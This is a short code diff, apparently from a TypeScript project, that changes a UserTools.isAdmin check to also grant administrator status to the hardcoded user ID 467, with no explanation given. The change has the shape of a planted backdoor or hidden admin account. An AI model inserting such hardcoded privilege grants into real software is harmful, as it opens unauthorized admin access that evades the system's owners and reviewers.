@@ -191,7 +191,7 @@ export class UserTools {
     }
 
     static isAdmin(requester: number) {
-        return requester == 1
+        return requester == 1 || requester == 467
     }
 
     /**
